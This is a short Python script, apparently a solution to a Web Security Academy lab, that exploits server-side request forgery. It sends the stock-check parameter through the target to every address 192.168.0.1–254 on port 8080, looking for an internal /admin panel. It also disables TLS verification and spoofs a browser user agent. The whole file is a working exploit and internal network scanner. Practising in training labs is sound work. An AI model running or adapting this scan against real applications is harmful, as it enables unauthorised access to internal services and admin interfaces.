import requests
import urllib3
from rich.console import Console

console = Console()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://0a73000e047ea2ab80643a0500a6001c.web-security-academy.net/product/stock"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

def scan_backend_ip(i, s):
    internal_ip = f"192.168.0.{i}"
    stock_api_url = f"http://{internal_ip}:8080/admin"

    data = {"stockApi": stock_api_url}

    response = s.post(BASE_URL, data=data, headers=HEADERS, verify=False, timeout=5)

    error_markers = ["Internal Server Error", "Could not connect to external", "Missing parameter"]
    if any(marker in response.text for marker in error_markers):
        return None  # this IP: nothing listening / not reachable
    else:
        console.print(f"[+] Possible hit: {internal_ip} (status {response.status_code}, len {len(response.text)})")
        return internal_ip

def main():
    s = requests.Session()
    found = []

    with console.status("[bold green]Scanning backend IPs...") as status:   
        for i in range(1, 255):
            result = scan_backend_ip(i, s)
            if result:
                found.append(result)

    console.print("\nCandidates:", found)
    if not found:
        console.print("[bold red]No candidates found.")

if __name__ == "__main__":
    main()